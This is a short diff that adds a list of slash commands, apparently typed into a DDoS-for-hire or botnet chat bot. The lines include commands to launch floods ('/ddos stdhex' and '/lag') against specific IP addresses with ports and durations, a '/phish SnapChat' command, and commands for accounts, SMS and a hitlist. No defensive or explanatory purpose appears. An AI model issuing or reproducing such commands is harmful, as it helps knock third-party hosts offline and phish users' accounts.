@@ -1,0 +1,12 @@
+/hitlist
+/bugbounty
+/lagstop
+/lag
+/accounts
+/methods
+/phish SnapChat
+/lag 75.133.27.108 Std 300 80
+/help
+/ddos stdhex 104.207.145.47 300
+/sms
+/ddos stdhex 104.207.145.47 300
